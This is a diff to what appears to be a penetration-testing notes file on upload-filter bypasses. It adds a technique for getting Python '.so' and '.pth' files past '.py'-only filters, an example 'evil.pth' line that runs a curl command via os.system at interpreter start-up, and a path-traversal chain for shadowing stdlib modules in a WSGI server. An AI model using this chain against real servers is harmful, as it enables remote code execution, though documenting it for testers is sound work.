@@ -129,6 +129,22 @@ xC4%AE (alternate encoding)
 .msi
 ```
 
+### Python — shadow-module bypass when only `.py`/`.pyc` are blocked
+
+Python imports `.so` (C extensions) and processes `.pth` (site init scripts) — **neither contains the substring `.py`**. So `if '.py' in filename` and `if filename.endswith('.py')` both miss them.
+
+```
+# .so naming Python actually looks for (all three are importable):
+mymod.so
+mymod.abi3.so
+subprocess.cpython-312-x86_64-linux-gnu.so   # full triplet for stdlib shadows
+
+# .pth in any sitedir (lines starting with 'import' are evaluated at site init)
+evil.pth        # content: import os; os.system('curl ...')
+```
+
+Combine with path traversal in the filename to drop the `.so` into the WSGI process `cwd` (usually a `sys.path` entry) and shadow a lazily-imported stdlib module on the next fresh-worker request. Full chain → `python-module-shadowing-via-so.md`.
+
 ### Burp Intruder for extension fuzzing
 
 ```
